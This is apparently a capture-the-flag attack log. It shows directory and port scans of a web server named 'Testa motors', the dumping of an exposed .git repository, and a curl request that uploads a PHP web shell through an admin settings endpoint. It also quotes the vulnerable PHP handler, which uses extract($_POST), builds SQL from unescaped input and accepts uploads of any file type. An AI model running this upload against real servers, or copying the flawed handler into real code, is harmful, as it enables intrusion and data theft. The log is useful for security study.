[Dec 10, 2025 - 10:04:06 (CET)] exegol-ocd-ctf /workspace # dirsearch -u http://15.237.216.194/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://15.237.216.194/

[10:04:11] Scanning: 
[10:04:12] 301 -   315B - /.git  ->  http://15.237.216.194/.git/
[10:04:12] 403 -   279B - /.git/branches/
[10:04:12] 403 -   279B - /.git/
[10:04:12] 200 -    45B - /.git/COMMIT_EDITMSG
[10:04:12] 200 -    92B - /.git/config
[10:04:12] 200 -    73B - /.git/description
[10:04:12] 200 -    23B - /.git/HEAD
[10:04:12] 403 -   279B - /.git/hooks/
[10:04:12] 403 -   279B - /.git/info/
[10:04:12] 200 -   240B - /.git/info/exclude
[10:04:12] 403 -   279B - /.git/logs/
[10:04:12] 200 -   683B - /.git/logs/HEAD
[10:04:12] 301 -   325B - /.git/logs/refs  ->  http://15.237.216.194/.git/logs/refs/
[10:04:12] 301 -   331B - /.git/logs/refs/heads  ->  http://15.237.216.194/.git/logs/refs/heads/
[10:04:12] 200 -   530B - /.git/logs/refs/heads/master
[10:04:12] 403 -   279B - /.git/objects/
[10:04:12] 403 -   279B - /.git/refs/
[10:04:12] 301 -   326B - /.git/refs/heads  ->  http://15.237.216.194/.git/refs/heads/
[10:04:12] 200 -    41B - /.git/refs/heads/master
[10:04:12] 301 -   325B - /.git/refs/tags  ->  http://15.237.216.194/.git/refs/tags/
[10:04:12] 200 -  217KB - /.git/index
[10:04:12] 403 -   279B - /.php
[10:04:14] 200 -   679B - /about.php
[10:04:14] 301 -   316B - /admin  ->  http://15.237.216.194/admin/
[10:04:14] 403 -   279B - /admin/.htaccess
[10:04:14] 302 -   16KB - /admin/  ->  login.php
[10:04:15] 200 -    5KB - /admin/home.php
[10:04:15] 302 -   16KB - /admin/index.php  ->  login.php
[10:04:15] 200 -    5KB - /admin/login.php
[10:04:17] 301 -   317B - /assets  ->  http://15.237.216.194/assets/
[10:04:17] 403 -   279B - /assets/
[10:04:18] 200 -     0B - /cron.php
[10:04:18] 200 -    25B - /cron.sh
[10:04:18] 301 -   314B - /css  ->  http://15.237.216.194/css/
[10:04:18] 301 -   319B - /database  ->  http://15.237.216.194/database/
[10:04:18] 403 -   279B - /database/
[10:04:19] 200 -    4KB - /footer.php
[10:04:20] 200 -     0B - /head.php
[10:04:20] 200 -    2KB - /header.php
[10:04:20] 200 -    7KB - /home.php
[10:04:20] 200 -   23KB - /index.php
[10:04:20] 200 -   23KB - /index.php/login/
[10:04:20] 200 -   88KB - /info.php
[10:04:20] 301 -   313B - /js  ->  http://15.237.216.194/js/
[10:04:20] 403 -   279B - /js/
[10:04:23] 200 -    30B - /robots.txt
[10:04:24] 200 -   10KB - /search.php
[10:04:24] 403 -   279B - /server-status/
[10:04:24] 403 -   279B - /server-status



Dec 10, 2025 - 10:05:06 (CET)] exegol-ocd-ctf /workspace # nmap -A 15.237.216.194 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-10 10:05 CET
Nmap scan report for ec2-15-237-216-194.eu-west-3.compute.amazonaws.com (15.237.216.194)
Host is up (0.0058s latency).
Not shown: 996 filtered tcp ports (no-response), 1 filtered tcp ports (port-unreach)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 cf5ec8f51d973bf306769f602fc1396e (RSA)
|   256 bec1687f8fddce899939440c6748b181 (ECDSA)
|_  256 b83d172b39704af519a618b140d07c90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-git: 
|   15.237.216.194:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: add htaccess to disable php in assets folder 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Testa motors
| http-robots.txt: 1 disallowed entry 
|_/admin
8080/tcp open  http    Apache Tomcat 8.5.6
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login - Testa Motors - Employees Listing
|_Requested resource was /login.xhtml
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 3.10 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.3 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.6 (91%), Linux 5.0 - 5.4 (91%), Linux 5.1 (91%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.60 ms box (192.168.1.1)
2   5.47 ms  ec2-15-237-216-194.eu-west-3.compute.amazonaws.com (15.237.216.194)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds

git-dumper http://15.237.216.194/.git/ ./dump


[Dec 10, 2025 - 10:29:40 (CET)] exegol-ocd-ctf admin # curl -X POST "http://15.237.216.194/admin/ajax.php?action=save_settings" \
  -F "name=a" \
  -F "email=b" \
  -F "contact=c" \
  -F "about=d" \
  -F "img=@shell.php"

1# 



```
function save_settings(){
		extract($_POST);
		$data = " name = '".str_replace("'","&#x2019;",$name)."' ";
		$data .= ", email = '$email' ";
		$data .= ", contact = '$contact' ";
		$data .= ", about_content = '".htmlentities(str_replace("'","&#x2019;",$about))."' ";
		if($_FILES['img']['tmp_name'] != ''){
						$fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
						$move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);
					$data .= ", cover_img = '$fname' ";

		}
		
		// echo "INSERT INTO system_settings set ".$data;
		$chk = $this->db->query("SELECT * FROM system_settings");
		if($chk->num_rows > 0){
			$save = $this->db->query("UPDATE system_settings set ".$data);
		}else{
			$save = $this->db->query("INSERT INTO system_settings set ".$data);
		}
		if($save){
		$query = $this->db->query("SELECT * FROM system_settings limit 1")->fetch_array();
		foreach ($query as $key => $value) {
			if(!is_numeric($key))
				$_SESSION['system'][$key] = $value;
		}

			return 1;
				}
	}

```